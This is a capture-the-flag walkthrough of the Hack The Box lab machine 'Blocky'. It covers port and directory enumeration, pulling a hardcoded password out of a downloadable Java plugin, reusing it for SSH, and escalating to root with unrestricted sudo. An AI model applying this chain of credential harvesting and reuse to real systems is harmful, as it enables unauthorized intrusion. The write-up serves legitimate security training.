---
clayout: ctf
title: Blocky
date: 2025-08-19
image: /ctf/hack-the-box/machines/blocky/info-card.png
type: Hack The Box

ctf:
    - name: Blocky
      link: https://app.hackthebox.com/machines/48
      thumbnail: /ctf/hack-the-box/machines/blocky/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/48
          thumbnail: /ctf/hack-the-box/machines/blocky/pwned.png
---

## Machine Overview

**Blocky** is an easy-rated Linux machine from HackTheBox that combines elements of web enumeration, source code analysis, and weak credential management. The main entry point is a WordPress website hosting downloadable Java plugins. By analyzing one of these JAR files, we recover hardcoded database credentials, which also grant us SSH access as a user. Privilege escalation is trivial since the compromised user has unrestricted `sudo` rights, allowing immediate root access.

## Enumeration

### Network Enumeration

We start with a basic port scan:

```bash
nmap -sC -sV -A -oN nmap.txt 10.10.10.37
```

**Scan Results:**

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d62b99b4d5e753ce2bfcb5d79d79fba2 (RSA)
|   256 5d7f389570c9beac67a01e86e7978403 (ECDSA)
|_  256 09d5c204951a90ef87562597df837067 (ED25519)
80/tcp open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://blocky.htb
```

## Web Enumeration

### Hostname Resolution

To properly resolve `blocky.htb`, we add an entry to `/etc/hosts`:

```bash
echo "10.10.10.37 blocky.htb" | sudo tee -a /etc/hosts
```

### Initial Web Application Access

Navigating to `http://blocky.htb/` reveals a **WordPress-based blog application**:

![Blocky Home Page](/ctf/hack-the-box/machines/blocky/home.png)

There is only one post, posted by a user `Notch`:

![Blocky Post](/ctf/hack-the-box/machines/blocky/post.png)

### Directory Enumeration

We use `gobuster` to enumerate hidden directories:

```bash
gobuster dir -u http://blocky.htb \
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt \
    -x php,html,txt \
    -o gobuster.txt
```

**Results:**

```bash
/index.php            (Status: 301) [Size: 0] [--> http://blocky.htb/]
/javascript           (Status: 301) [Size: 313] [--> http://blocky.htb/javascript/]
/phpmyadmin           (Status: 301) [Size: 313] [--> http://blocky.htb/phpmyadmin/]
/plugins              (Status: 301) [Size: 310] [--> http://blocky.htb/plugins/]
/wiki                 (Status: 301) [Size: 307] [--> http://blocky.htb/wiki/]
/wp-admin             (Status: 301) [Size: 311] [--> http://blocky.htb/wp-admin/]
/wp-content           (Status: 301) [Size: 313] [--> http://blocky.htb/wp-content/]
/wp-includes          (Status: 301) [Size: 314] [--> http://blocky.htb/wp-includes/]
/wp-login.php         (Status: 200) [Size: 2397]
/wp-trackback.php     (Status: 200) [Size: 135]
```

Looking at the `/plugins/` directory, we find two downloadable JAR files:

![Blocky Plugins](/ctf/hack-the-box/machines/blocky/plugins.png)

## Vulnerability Analysis & Exploitation

### Java Application Analysis

We extract the contents of `BlockyCore.jar` file:

```bash
jar xf BlockyCore.jar
```

Inside, we find a `BlockyCore.class` file, which reveals hardcoded database credentials:

```java
public class BlockyCore {
    public String sqlHost = "localhost";
    public String sqlUser = "root";
    public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
    // ... additional code
}
```

Although intended for database use, the password also works for SSH.
Using `notch:8YsqfCTnvxAUeduzjNSXe22`, we successfully log in as the `notch` user:

```bash
$ ssh notch@10.10.10.37
notch@10.10.10.37's password: 8YsqfCTnvxAUeduzjNSXe22
notch@Blocky:~$ id
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

> [!NOTE] User Flag
> The user flag is in `/home/notch/user.txt` file.

## Privilege Escalation (notch to root)

### Sudo Privilege Escalation

We check for elevated privileges:

```bash
notch@Blocky:~$ sudo -l
# ...
User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

This means `notch` has unrestricted sudo access.

### Root Access

We escalate directly:

```bash
notch@Blocky:~$ sudo su -
root@Blocky:~# id
uid=0(root) gid=0(root) groups=0(root)
```

> [!TIP]
> The `-` at the end of the `su` command make the shell a login shell. That means the shell will load the environment variables from the `/root/.bashrc` file.

> [!NOTE] Root Flag
> The root flag is in `/root/root.txt` file.
